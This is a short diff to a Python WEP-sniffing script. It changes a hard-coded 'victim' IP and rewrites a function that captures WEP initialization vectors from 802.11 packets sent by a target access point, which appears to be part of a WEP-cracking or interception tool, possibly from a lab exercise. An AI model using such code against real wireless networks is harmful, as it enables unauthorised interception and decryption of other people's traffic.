@@ -6,7 +6,7 @@ import WEP_sniffer
 
 
 # Define the victim's IP address
-victim_ip = "192.168.3.103"
+victim_ip = "192.168.3.104"
 webserver_ip = "192.168.3.102"
 
 # Define network information
@@ -23,10 +23,13 @@ def decrypt(packet, bssid, WEP_key):
 
 
 def iv_catcher(packet, bssid):
-    if packet.haslayer(Dot11WEP):
-        iv = packet[Dot11WEP].iv
-
-    return iv
+    if packet.haslayer(Dot11):
+        if packet.addr2 == bssid.lower() or packet.addr3 == bssid.lower():
+            if packet.haslayer(Dot11WEP):
+                iv = packet[Dot11WEP].iv
+                return iv
+            else:
+                return "error"
 
 
 '''def packet_callback(packet):
